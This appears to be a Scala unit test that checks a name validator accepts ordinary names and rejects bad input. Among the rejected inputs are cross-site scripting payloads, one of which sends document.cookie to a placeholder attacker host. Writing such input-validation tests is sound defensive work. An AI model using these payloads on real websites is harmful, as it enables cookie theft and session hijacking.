package com.theseventhsense.utils.types
import octopus.syntax._
import org.scalatest.{MustMatchers, WordSpec}

class NameSpec extends WordSpec with MustMatchers {
  val validNames =
    """abc
      |test
      |test name
      |test name with email@domain.com
    """.stripMargin.lines

  val invalidNames =
  """
    |ab
    |name <script>alert("xss");//baz</script>
    |><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>
  """.stripMargin.lines

  "the name class" should {
    "be able to validate input strings" in {
      validNames.map(Name(_)).foreach(n => n.validate.toEither mustBe Right(n))
      invalidNames.map(Name(_)).foreach(n => n.validate.toEither mustBe a[Left[_, _]])
    }
  }

}
